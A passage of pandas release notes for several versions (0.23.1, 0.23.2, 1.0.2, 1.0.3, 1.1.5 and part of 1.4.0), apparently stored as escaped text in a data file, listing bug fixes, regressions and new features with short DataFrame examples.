strings (:issue:`32117`)\n- Fixed bug in :meth:`DataFrame.convert_dtypes` where ``BooleanDtype`` columns were converted to ``Int64`` (:issue:`32287`)\n- Fixed bug in setting values using a slice indexer with string dtype (:issue:`31772`)\n- Fixed bug where :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` would raise a ``TypeError`` when groups contained ``pd.NA`` in a column of object dtype (:issue:`32123`)\n- Fixed bug where :meth:`DataFrameGroupBy.mean`, :meth:`DataFrameGroupBy.median`, :meth:`DataFrameGroupBy.var`, and :meth:`DataFrameGroupBy.std` would raise a ``TypeError`` on ``Int64`` dtype columns (:issue:`32219`)\n\n**Strings**\n\n- Using ``pd.NA`` with :meth:`Series.str.repeat` now correctly outputs a null value instead of raising error for vector inputs (:issue:`31632`)\n\n**Rolling**\n\n- Fixed rolling operations with variable window (defined by time duration) on decreasing time index (:issue:`32385`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_102.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.1..v1.0.2\n\n\n.. _whatsnew_0232:\n\nWhat's new in 0.23.2 (July 5, 2018)\n-----------------------------------\n\n{{ header }}\n\n\nThis is a minor bug-fix release in the 0.23.x series and includes some small regression fixes\nand bug fixes. We recommend that all users upgrade to this version.\n\n.. note::\n\n   pandas 0.23.2 is first pandas release that's compatible with\n   Python 3.7 (:issue:`20552`)\n\n.. warning::\n\n   Starting January 1, 2019, pandas feature releases will support Python 3 only.\n   See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more.\n\n.. contents:: What's new in v0.23.2\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0232.enhancements:\n\nLogical reductions over entire DataFrame\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n:meth:`DataFrame.all` and :meth:`DataFrame.any` now accept ``axis=None`` to reduce over all axes to a scalar (:issue:`19976`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2], \"B\": [True, False]})\n   df.all(axis=None)\n\n\nThis also provides compatibility with NumPy 1.15, which now dispatches to ``DataFrame.all``.\nWith NumPy 1.15 and pandas 0.23.1 or earlier, :func:`numpy.all` will no longer reduce over every axis:\n\n.. code-block:: python\n\n   >>>  NumPy 1.15, pandas 0.23.1\n   >>> np.any(pd.DataFrame({\"A\": [False], \"B\": [False]}))\n   A    False\n   B    False\n   dtype: bool\n\nWith pandas 0.23.2, that will correctly return False, as it did with NumPy < 1.15.\n\n.. ipython:: python\n\n   np.any(pd.DataFrame({\"A\": [False], \"B\": [False]}))\n\n\n.. _whatsnew_0232.fixed_regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`to_csv` when handling file-like object incorrectly (:issue:`21471`)\n- Re-allowed duplicate level names of a ``MultiIndex``. Accessing a level that has a duplicate name by name still raises an error (:issue:`19029`).\n- Bug in both :meth:`DataFrame.first_valid_index` and :meth:`Series.first_valid_index` raised for a row index having duplicate values (:issue:`21441`)\n- Fixed printing of DataFrames with hierarchical columns with long names (:issue:`21180`)\n- Fixed regression in :meth:`~DataFrame.reindex` and :meth:`~DataFrame.groupby`\n  with a MultiIndex or multiple keys that contains categorical datetime-like values (:issue:`21390`).\n- Fixed regression in unary negative operations with object dtype (:issue:`21380`)\n- Bug in :meth:`Timestamp.ceil` and :meth:`Timestamp.floor` when timestamp is a multiple of the rounding frequency (:issue:`21262`)\n- Fixed regression in :func:`to_clipboard` that defaulted to copying dataframes with space delimited instead of tab delimited (:issue:`21104`)\n\n\nBuild changes\n~~~~~~~~~~~~~\n\n- The source and binary distributions no longer include test data files, resulting in smaller download sizes. Tests relying on these data files will be skipped when using ``pandas.test()``. (:issue:`19320`)\n\n.. _whatsnew_0232.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**Conversion**\n\n- Bug in constructing :class:`Index` with an iterator or generator (:issue:`21470`)\n- Bug in :meth:`Series.nlargest` for signed and unsigned integer dtypes when the minimum value is present (:issue:`21426`)\n\n**Indexing**\n\n- Bug in :meth:`Index.get_indexer_non_unique` with categorical key (:issue:`21448`)\n- Bug in comparison operations for :class:`MultiIndex` where error was raised on equality / inequality comparison involving a MultiIndex with ``nlevels == 1`` (:issue:`21149`)\n- Bug in :meth:`DataFrame.drop` behaviour is not consistent for unique and non-unique indexes (:issue:`21494`)\n- Bug in :func:`DataFrame.duplicated` with a large number of columns causing a 'maximum recursion depth exceeded' (:issue:`21524`).\n\n**I/O**\n\n- Bug in :func:`read_csv` that caused it to incorrectly raise an error when ``nrows=0``, ``low_memory=True``, and ``index_col`` was not ``None`` (:issue:`21141`)\n- Bug in :func:`json_normalize` when formatting the ``record_prefix`` with integer columns (:issue:`21536`)\n\n**Categorical**\n\n- Bug in rendering :class:`Series` with ``Categorical`` dtype in rare conditions under Python 2.7 (:issue:`21002`)\n\n**Timezones**\n\n- Bug in :class:`Timestamp` and :class:`DatetimeIndex` where passing a :class:`Timestamp` localized after a DST transition would return a datetime before the DST transition (:issue:`20854`)\n- Bug in comparing :class:`DataFrame` with tz-aware :class:`DatetimeIndex` columns with a DST transition that raised a ``KeyError`` (:issue:`19970`)\n- Bug in :meth:`DatetimeIndex.shift` where an ``AssertionError`` would raise when shifting across DST (:issue:`8616`)\n- Bug in :class:`Timestamp` constructor where passing an invalid timezone offset designator (``Z``) would not raise a ``ValueError`` (:issue:`8910`)\n- Bug in :meth:`Timestamp.replace` where replacing at a DST boundary would retain an incorrect offset (:issue:`7825`)\n- Bug in :meth:`DatetimeIndex.reindex` when reindexing a tz-naive and tz-aware :class:`DatetimeIndex` (:issue:`8306`)\n- Bug in :meth:`DatetimeIndex.resample` when downsampling across a DST boundary (:issue:`8531`)\n\n**Timedelta**\n\n- Bug in :class:`Timedelta` where non-zero timedeltas shorter than 1 microsecond were considered False (:issue:`21484`)\n\n.. _whatsnew_0.23.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.23.1..v0.23.2\n\n\n.. _whatsnew_115:\n\nWhat's new in 1.1.5 (December 07, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.1.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in addition of a timedelta-like scalar to a :class:`DatetimeIndex` raising incorrectly (:issue:`37295`)\n- Fixed regression in :meth:`Series.groupby` raising when the :class:`Index` of the :class:`Series` had a tuple as its name (:issue:`37755`)\n- Fixed regression in :meth:`DataFrame.loc` and :meth:`Series.loc` for ``__setitem__`` when one-dimensional tuple was given to select from :class:`MultiIndex` (:issue:`37711`)\n- Fixed regression in inplace operations on :class:`Series` with ``ExtensionDtype`` with NumPy dtyped operand (:issue:`37910`)\n- Fixed regression in metadata propagation for ``groupby`` iterator (:issue:`37343`)\n- Fixed regression in :class:`MultiIndex` constructed from a :class:`DatetimeIndex` not retaining frequency (:issue:`35563`)\n- Fixed regression in :class:`Index` constructor raising a ``AttributeError`` when passed a :class:`SparseArray` with datetime64 values (:issue:`35843`)\n- Fixed regression in :meth:`DataFrame.unstack` with columns with integer dtype (:issue:`37115`)\n- Fixed regression in indexing on a :class:`Series` with ``CategoricalDtype`` after unpickling (:issue:`37631`)\n- Fixed regression in :meth:`DataFrame.groupby` aggregation with out-of-bounds datetime objects in an object-dtype column (:issue:`36003`)\n- Fixed regression in ``df.groupby(..).rolling(..)`` with the resulting :class:`MultiIndex` when grouping by a label that is in the index (:issue:`37641`)\n- Fixed regression in :meth:`DataFrame.fillna` not filling ``NaN`` after other operations such as :meth:`DataFrame.pivot` (:issue:`36495`).\n- Fixed performance regression in ``df.groupby(..).rolling(..)`` (:issue:`38038`)\n- Fixed regression in :meth:`MultiIndex.intersection` returning duplicates when at least one of the indexes had duplicates (:issue:`36915`)\n- Fixed regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` where ``None`` was considered a non-NA value (:issue:`38286`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in pytables methods in python 3.9 (:issue:`38041`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.other:\n\nOther\n~~~~~\n- Only set ``-Werror`` as a compiler flag in the CI jobs (:issue:`33315`, :issue:`33314`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_115.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.4..v1.1.5|HEAD\n\n\n\n.. _whatsnew_103:\n\nWhat's new in 1.0.3 (March 17, 2020)\n------------------------------------\n\nThese are the changes in pandas 1.0.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_103.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in ``resample.agg`` when the underlying data is non-writeable (:issue:`31710`)\n- Fixed regression in :class:`DataFrame` exponentiation with reindexing (:issue:`32685`)\n\n.. _whatsnew_103.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.2..v1.0.3\n\n\n.. _whatsnew_0231:\n\nWhat's new in 0.23.1 (June 12, 2018)\n------------------------------------\n\n{{ header }}\n\n\nThis is a minor bug-fix release in the 0.23.x series and includes some small regression fixes\nand bug fixes. We recommend that all users upgrade to this version.\n\n.. warning::\n\n   Starting January 1, 2019, pandas feature releases will support Python 3 only.\n   See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more.\n\n.. contents:: What's new in v0.23.1\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0231.fixed_regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n**Comparing Series with datetime.date**\n\nWe've reverted a 0.23.0 change to comparing a :class:`Series` holding datetimes and a ``datetime.date`` object (:issue:`21152`).\nIn pandas 0.22 and earlier, comparing a Series holding datetimes and ``datetime.date`` objects would coerce the ``datetime.date`` to a datetime before comparing.\nThis was inconsistent with Python, NumPy, and :class:`DatetimeIndex`, which never consider a datetime and ``datetime.date`` equal.\n\nIn 0.23.0, we unified operations between DatetimeIndex and Series, and in the process changed comparisons between a Series of datetimes and ``datetime.date`` without warning.\n\nWe've temporarily restored the 0.22.0 behavior, so datetimes and dates may again compare equal, but restore the 0.23.0 behavior in a future release.\n\nTo summarize, here's the behavior in 0.22.0, 0.23.0, 0.23.1:\n\n.. code-block:: python\n\n    0.22.0... Silently coerce the datetime.date\n   >>> import datetime\n   >>> pd.Series(pd.date_range('2017', periods=2)) == datetime.date(2017, 1, 1)\n   0     True\n   1    False\n   dtype: bool\n\n    0.23.0... Do not coerce the datetime.date\n   >>> pd.Series(pd.date_range('2017', periods=2)) == datetime.date(2017, 1, 1)\n   0    False\n   1    False\n   dtype: bool\n\n    0.23.1... Coerce the datetime.date with a warning\n   >>> pd.Series(pd.date_range('2017', periods=2)) == datetime.date(2017, 1, 1)\n   /bin/python:1: FutureWarning: Comparing Series of datetimes with 'datetime.date'.  Currently, the\n   'datetime.date' is coerced to a datetime. In the future pandas will\n   not coerce, and the values not compare equal to the 'datetime.date'.\n   To retain the current behavior, convert the 'datetime.date' to a\n   datetime with 'pd.Timestamp'.\n     !/bin/python3\n   0     True\n   1    False\n   dtype: bool\n\nIn addition, ordering comparisons will raise a ``TypeError`` in the future.\n\n**Other fixes**\n\n- Reverted the ability of :func:`~DataFrame.to_sql` to perform multivalue\n  inserts as this caused regression in certain cases (:issue:`21103`).\n  In the future this will be made configurable.\n- Fixed regression in the :attr:`DatetimeIndex.date` and :attr:`DatetimeIndex.time`\n  attributes in case of timezone-aware data: :attr:`DatetimeIndex.time` returned\n  a tz-aware time instead of tz-naive (:issue:`21267`) and :attr:`DatetimeIndex.date`\n  returned incorrect date when the input date has a non-UTC timezone (:issue:`21230`).\n- Fixed regression in :meth:`pandas.io.json.json_normalize` when called with ``None`` values\n  in nested levels in JSON, and to not drop keys with value as ``None`` (:issue:`21158`, :issue:`21356`).\n- Bug in :meth:`~DataFrame.to_csv` causes encoding error when compression and encoding are specified (:issue:`21241`, :issue:`21118`)\n- Bug preventing pandas from being importable with -OO optimization (:issue:`21071`)\n- Bug in :meth:`Categorical.fillna` incorrectly raising a ``TypeError`` when ``value`` the individual categories are iterable and ``value`` is an iterable (:issue:`21097`, :issue:`19788`)\n- Fixed regression in constructors coercing NA values like ``None`` to strings when passing ``dtype=str`` (:issue:`21083`)\n- Regression in :func:`pivot_table` where an ordered ``Categorical`` with missing\n  values for the pivot's ``index`` would give a mis-aligned result (:issue:`21133`)\n- Fixed regression in merging on boolean index/columns (:issue:`21119`).\n\n.. _whatsnew_0231.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved performance of :meth:`CategoricalIndex.is_monotonic_increasing`, :meth:`CategoricalIndex.is_monotonic_decreasing` and :meth:`CategoricalIndex.is_monotonic` (:issue:`21025`)\n- Improved performance of :meth:`CategoricalIndex.is_unique` (:issue:`21107`)\n\n\n.. _whatsnew_0231.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**Groupby/resample/rolling**\n\n- Bug in :func:`DataFrame.agg` where applying multiple aggregation functions to a :class:`DataFrame` with duplicated column names would cause a stack overflow (:issue:`21063`)\n- Bug in :func:`.GroupBy.ffill` and :func:`.GroupBy.bfill` where the fill within a grouping would not always be applied as intended due to the implementations' use of a non-stable sort (:issue:`21207`)\n- Bug in :func:`.GroupBy.rank` where results did not scale to 100% when specifying ``method='dense'`` and ``pct=True``\n- Bug in :func:`pandas.DataFrame.rolling` and :func:`pandas.Series.rolling` which incorrectly accepted a 0 window size rather than raising (:issue:`21286`)\n\n**Data-type specific**\n\n- Bug in :meth:`Series.str.replace()` where the method throws ``TypeError`` on Python 3.5.2 (:issue:`21078`)\n- Bug in :class:`Timedelta` where passing a float with a unit would prematurely round the float precision (:issue:`14156`)\n- Bug in :func:`pandas.testing.assert_index_equal` which raised ``AssertionError`` incorrectly, when comparing two :class:`CategoricalIndex` objects with param ``check_categorical=False`` (:issue:`19776`)\n\n**Sparse**\n\n- Bug in :attr:`SparseArray.shape` which previously only returned the shape :attr:`SparseArray.sp_values` (:issue:`21126`)\n\n**Indexing**\n\n- Bug in :meth:`Series.reset_index` where appropriate error was not raised with an invalid level name (:issue:`20925`)\n- Bug in :func:`interval_range` when ``start``/``periods`` or ``end``/``periods`` are specified with float ``start`` or ``end`` (:issue:`21161`)\n- Bug in :meth:`MultiIndex.set_names` where error raised for a ``MultiIndex`` with ``nlevels == 1`` (:issue:`21149`)\n- Bug in :class:`IntervalIndex` constructors where creating an ``IntervalIndex`` from categorical data was not fully supported (:issue:`21243`, :issue:`21253`)\n- Bug in :meth:`MultiIndex.sort_index` which was not guaranteed to sort correctly with ``level=1``; this was also causing data misalignment in particular :meth:`DataFrame.stack` operations (:issue:`20994`, :issue:`20945`, :issue:`21052`)\n\n**Plotting**\n\n- New keywords (sharex, sharey) to turn on/off sharing of x/y-axis by subplots generated with pandas.DataFrame().groupby().boxplot() (:issue:`20968`)\n\n**I/O**\n\n- Bug in IO methods specifying ``compression='zip'`` which produced uncompressed zip archives (:issue:`17778`, :issue:`21144`)\n- Bug in :meth:`DataFrame.to_stata` which prevented exporting DataFrames to buffers and most file-like objects (:issue:`21041`)\n- Bug in :meth:`read_stata` and :class:`StataReader` which did not correctly decode utf-8 strings on Python 3 from Stata 14 files (dta version 118) (:issue:`21244`)\n- Bug in IO JSON :func:`read_json` reading empty JSON schema with ``orient='table'`` back to :class:`DataFrame` caused an error (:issue:`21287`)\n\n**Reshaping**\n\n- Bug in :func:`concat` where error was raised in concatenating :class:`Series` with numpy scalar and tuple names (:issue:`21015`)\n- Bug in :func:`concat` warning message providing the wrong guidance for future behavior (:issue:`21101`)\n\n**Other**\n\n- Tab completion on :class:`Index` in IPython no longer outputs deprecation warnings (:issue:`21125`)\n- Bug preventing pandas being used on Windows without C++ redistributable installed (:issue:`21106`)\n\n.. _whatsnew_0.23.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.23.0..v0.23.1\n\n\n.. _whatsnew_140:\n\nWhat's new in 1.4.0 (January 22, 2022)\n--------------------------------------\n\nThese are the changes in pandas 1.4.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_140.enhancements.warning_lineno:\n\nImproved warning messages\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, warning messages may have pointed to lines within the pandas\nlibrary. Running the script ``setting_with_copy_warning.py``\n\n.. code-block:: python\n\n    import pandas as pd\n\n    df = pd.DataFrame({'a': [1, 2, 3]})\n    df[:2].loc[:, 'a'] = 5\n\nwith pandas 1.3 resulted in::\n\n    .../site-packages/pandas/core/indexing.py:1951: SettingWithCopyWarning:\n    A value is trying to be set on a copy of a slice from a DataFrame.\n\nThis made it difficult to determine where the warning was being generated from.\nNow pandas will inspect the call stack, reporting the first line outside of the\npandas library that gave rise to the warning. The output of the above script is\nnow::\n\n    setting_with_copy_warning.py:4: SettingWithCopyWarning:\n    A value is trying to be set on a copy of a slice from a DataFrame.\n\n\n\n\n.. _whatsnew_140.enhancements.ExtensionIndex:\n\nIndex can hold arbitrary ExtensionArrays\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nUntil now, passing a custom :class:`ExtensionArray` to ``pd.Index`` would cast\nthe array to ``object`` dtype. Now :class:`Index` can directly hold arbitrary\nExtensionArrays (:issue:`43930`).\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   arr = pd.array([1, 2, pd.NA])\n   idx = pd.Index(arr)\n\nIn the old behavior, ``idx`` would be object-dtype:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: idx\n   Out[1]: Index([1, 2, <NA>], dtype='object')\n\nWith the new behavior, we keep the original dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   idx\n\nOne exception to this is ``SparseArray``, which will continue to cast to numpy\ndtype until pandas 2.0. At that point it will retain its dtype like other\nExtensionArrays.\n\n.. _whatsnew_140.enhancements.styler:\n\nStyler\n^^^^^^\n\n:class:`.Styler` has been further developed in 1.4.0. The following general enhancements have been made:\n\n  - Styling and formatting of indexes has been added, with :meth:`.Styler.apply_index`, :meth:`.Styler.applymap_index` and :meth:`.Styler.format_index`. These mirror the signature of the methods already used to style and format data values, and work with both HTML, LaTeX and Excel format (:issue:`41893`, :issue:`43101`, :issue:`41993`, :issue:`41995`)\n  - The new method :meth:`.Styler.hide` deprecates :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` (:issue:`43758`)\n  - The keyword arguments ``level`` and ``names`` have been added to :meth:`.Styler.hide` (and implicitly to the deprecated methods :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns`) for additional control of visibility of MultiIndexes and of Index names (:issue:`25475`, :issue:`43404`, :issue:`43346`)\n", "1.3.0": "  - Global options under the category ``pd.options.styler`` have been extended to configure default ``Styler`` properties which address formatting, encoding, and HTML and LaTeX rendering. Note that formerly ``Styler`` relied on ``display.html.use_mathjax``, which has now been replaced by ``styler.html.mathjax`` (:issue:`41395`)\n  - Validation of certain keyword arguments, e.g. ``caption`` (:issue:`43368`)\n  - Various bug fixes as recorded below\n\nAdditionally there are specific enhancements to the HTML specific rendering:\n\n  - :meth:`.Styler.bar` introduces additional arguments to control alignment and display (:issue:`26070`, :issue:`36419`), and it also validates the input arguments ``width`` and ``height`` (:issue:`42511`)\n  - :meth:`.Styler.to_html` introduces keyword arguments ``sparse_index``, ``sparse_columns``, ``bold_headers``, ``caption``, ``max_rows`` and ``max_columns`` (:issue:`41946`, :issue:`43149`, :issue:`42972`)\n  - :meth:`.Styler.to_html` omits CSSStyle rules for hidden table elements as a performance enhancement (:issue:`43619`)\n  - Custom CSS classes can now be directly specified without string replacement (:issue:`43686`)\n  - Ability to render hyperlinks automatically via a new ``hyperlinks`` formatting keyword argument (:issue:`45058`)\n\nThere are also some LaTeX specific enhancements:\n\n  - :meth:`.Styler.to_latex` introduces keyword argument ``environment``, which also allows a specific \"longtable\" entry through a separate jinja2 template (:issue:`41866`)\n  - Naive sparsification is now possible for LaTeX without the necessity of including the multirow package (:issue:`43369`)\n  - *cline* support has been added for :class:`MultiIndex` row sparsification through a keyword argument (:issue:`45138`)\n\n.. _whatsnew_140.enhancements.pyarrow_csv_engine:\n\nMulti-threaded CSV reading with a new CSV Engine based on pyarrow\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`pandas.read_csv` now accepts ``engine=\"pyarrow\"`` (requires at least\n``pyarrow`` 1.0.1) as an argument, allowing for faster csv parsing on multicore\nmachines with pyarrow installed. See the :doc:`I/O docs </user_guide/io>` for\nmore info. (:issue:`23697`, :issue:`43706`)\n\n.. _whatsnew_140.enhancements.window_rank:\n\nRank function for rolling and expanding windows\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAdded ``rank`` function to :class:`Rolling` and :class:`Expanding`. The new\nfunction supports the ``method``, ``ascending``, and ``pct`` flags of\n:meth:`DataFrame.rank`. The ``method`` argument supports ``min``, ``max``, and\n``average`` ranking methods.\nExample:\n\n.. ipython:: python\n\n    s = pd.Series([1, 4, 2, 3, 5, 3])\n    s.rolling(3).rank()\n\n    s.rolling(3).rank(method=\"max\")\n\n.. _whatsnew_140.enhancements.groupby_indexing:\n\nGroupby positional indexing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIt is now possible to specify positional ranges relative to the ends of each\ngroup.\n\nNegative arguments for :meth:`.DataFrameGroupBy.head`, :meth:`.SeriesGroupBy.head`, :meth:`.DataFrameGroupBy.tail`, and :meth:`.SeriesGroupBy.tail` now work\ncorrectly and result in ranges relative to the end and start of each group,\nrespectively. Previously, negative arguments returned empty frames.\n\n.. ipython:: python\n\n    df = pd.DataFrame([[\"g\", \"g0\"], [\"g\", \"g1\"], [\"g\", \"g2\"], [\"g\", \"g3\"],\n                       [\"h\", \"h0\"], [\"h\", \"h1\"]], columns=[\"A\", \"B\"])\n    df.groupby(\"A\").head(-1)\n\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now accept a slice or list of integers and slices.\n\n.. ipython:: python\n\n    df.groupby(\"A\").nth(slice(1, -1))\n    df.groupby(\"A\").nth([slice(None, 1), slice(-1, None)])\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now accept index notation.\n\n.. ipython:: python\n\n    df.groupby(\"A\").nth[1, -1]\n    df.groupby(\"A\").nth[1:-1]\n    df.groupby(\"A\").nth[:1, -1:]\n\n.. _whatsnew_140.dict_tight:\n\nDataFrame.from_dict and DataFrame.to_dict have new ``'tight'`` option\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new ``'tight'`` dictionary format that preserves :class:`MultiIndex` entries\nand names is now available with the :meth:`DataFrame.from_dict` and\n:meth:`DataFrame.to_dict` methods and can be used with the standard ``json``\nlibrary to produce a tight representation of :class:`DataFrame` objects\n(:issue:`4889`).\n\n.. ipython:: python\n\n    df = pd.DataFrame.from_records(\n        [[1, 3], [2, 4]],\n        index=pd.MultiIndex.from_tuples([(\"a\", \"b\"), (\"a\", \"c\")],\n                                        names=[\"n1\", \"n2\"]),\n        columns=pd.MultiIndex.from_tuples([(\"x\", 1), (\"y\", 2)],\n                                          names=[\"z1\", \"z2\"]),\n    )\n    df\n    df.to_dict(orient='tight')\n\n.. _whatsnew_140.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- :meth:`concat` will preserve the ``attrs`` when it is the same for all objects and discard the ``attrs`` when they are different (:issue:`41828`)\n- :class:`DataFrameGroupBy` operations with ``as_index=False`` now correctly retain ``ExtensionDtype`` dtypes for columns being grouped on (:issue:`41373`)\n- Add support for assigning values to ``by`` argument in :meth:`DataFrame.plot.hist` and :meth:`DataFrame.plot.box` (:issue:`15079`)\n- :meth:`Series.sample`, :meth:`DataFrame.sample`, :meth:`.DataFrameGroupBy.sample`, and :meth:`.SeriesGroupBy.sample` now accept a ``np.random.Generator`` as input to ``random_state``. A generator will be more performant, especially with ``replace=False`` (:issue:`38100`)\n- :meth:`Series.ewm` and :meth:`DataFrame.ewm` now support a ``method`` argument with a ``'table'`` option that performs the windowing operation over an entire :class:`DataFrame`. See :ref:`Window Overview <window.overview>` for performance and functional benefits (:issue:`42273`)\n- :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax`, and :meth:`.SeriesGroupBy.cummax` now support the argument ``skipna`` (:issue:`34047`)\n- :meth:`read_table` now supports the argument ``storage_options`` (:issue:`39167`)\n- :meth:`DataFrame.to_stata` and :meth:`StataWriter` now accept the keyword only argument ``value_labels`` to save labels for non-categorical columns (:issue:`38454`)\n- Methods that relied on hashmap based algos such as :meth:`DataFrameGroupBy.value_counts`, :meth:`DataFrameGroupBy.count` and :func:`factorize` ignored imaginary component for complex numbers (:issue:`17927`)\n- Add :meth:`Series.str.removeprefix` and :meth:`Series.str.removesuffix` introduced in Python 3.9 to remove pre-/suffixes from string-type :class:`Series` (:issue:`36944`)\n- Attempting to write into a file in missing parent directory with :meth:`DataFrame.to_csv`, :meth:`DataFrame.to_html`, :meth:`DataFrame.to_excel`, :meth:`DataFrame.to_feather`, :meth:`DataFrame.to_parquet`, :meth:`DataFrame.to_stata`, :meth:`DataFrame.to_json`, :meth:`DataFrame.to_pickle`, and :meth:`DataFrame.to_xml` now explicitly mentions missing parent directory, the same is true for :class:`Series` counterparts (:issue:`24306`)\n- Indexing with ``.loc`` and ``.iloc`` now supports ``Ellipsis`` (:issue:`37750`)\n- :meth:`IntegerArray.all` , :meth:`IntegerArray.any`, :meth:`FloatingArray.any`, and :meth:`FloatingArray.all` use Kleene logic (:issue:`41967`)\n- Added support for nullable boolean and integer types in :meth:`DataFrame.to_stata`, :class:`~pandas.io.stata.StataWriter`, :class:`~pandas.io.stata.StataWriter117`, and :class:`~pandas.io.stata.StataWriterUTF8` (:issue:`40855`)\n- :meth:`DataFrame.__pos__` and :meth:`DataFrame.__neg__` now retain ``ExtensionDtype`` dtypes (:issue:`43883`)\n- The error raised when an optional dependency can't be imported now includes the original exception, for easier investigation (:issue:`43882`)\n- Added :meth:`.ExponentialMovingWindow.sum` (:issue:`13297`)\n- :meth:`Series.str.split` now supports a ``regex`` argument that explicitly specifies whether the pattern is a regular expression. Default is ``None`` (:issue:`43563`, :issue:`32835`, :issue:`25549`)\n- :meth:`DataFrame.dropna` now accepts a single label as ``subset`` along with array-like (:issue:`41021`)\n- Added :meth:`DataFrameGroupBy.value_counts` (:issue:`43564`)\n- :func:`read_csv` now accepts a ``callable`` function in ``on_bad_lines`` when ``engine=\"python\"`` for custom handling of bad lines (:issue:`5686`)\n- :class:`ExcelWriter` argument ``if_sheet_exists=\"overlay\"`` option added (:issue:`40231`)\n- :meth:`read_excel` now accepts a ``decimal`` argument that allow the user to specify the decimal point when parsing string columns to numeric (:issue:`14403`)\n- :meth:`.DataFrameGroupBy.mean`, :meth:`.SeriesGroupBy.mean`, :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std`, :meth:`.DataFrameGroupBy.var`, :meth:`.SeriesGroupBy.var`, :meth:`.DataFrameGroupBy.sum`, and :meth:`.SeriesGroupBy.sum` now support `Numba <http://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`43731`, :issue:`44862`, :issue:`44939`)\n- :meth:`Timestamp.isoformat` now handles the ``timespec`` argument from the base ``datetime`` class (:issue:`26131`)\n- :meth:`NaT.to_numpy` ``dtype`` argument is now respected, so ``np.timedelta64`` can be returned (:issue:`44460`)\n- New option ``display.max_dir_items`` customizes the number of columns added to :meth:`Dataframe.__dir__` and suggested for tab completion (:issue:`37996`)\n- Added \"Juneteenth National Independence Day\" to ``USFederalHolidayCalendar`` (:issue:`44574`)\n- :meth:`.Rolling.var`, :meth:`.Expanding.var`, :meth:`.Rolling.std`, and :meth:`.Expanding.std` now support `Numba <http://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`44461`)\n- :meth:`Series.info` has been added, for compatibility with :meth:`DataFrame.info` (:issue:`5167`)\n- Implemented :meth:`IntervalArray.min` and :meth:`IntervalArray.max`, as a result of which ``min`` and ``max`` now work for :class:`IntervalIndex`, :class:`Series` and :class:`DataFrame` with ``IntervalDtype`` (:issue:`44746`)\n- :meth:`UInt64Index.map` now retains ``dtype`` where possible (:issue:`44609`)\n- :meth:`read_json` can now parse unsigned long long integers (:issue:`26068`)\n- :meth:`DataFrame.take` now raises a ``TypeError`` when passed a scalar for the indexer (:issue:`42875`)\n- :meth:`is_list_like` now identifies duck-arrays as list-like unless ``.ndim == 0`` (:issue:`35131`)\n- :class:`ExtensionDtype` and :class:`ExtensionArray` are now (de)serialized when exporting a :class:`DataFrame` with 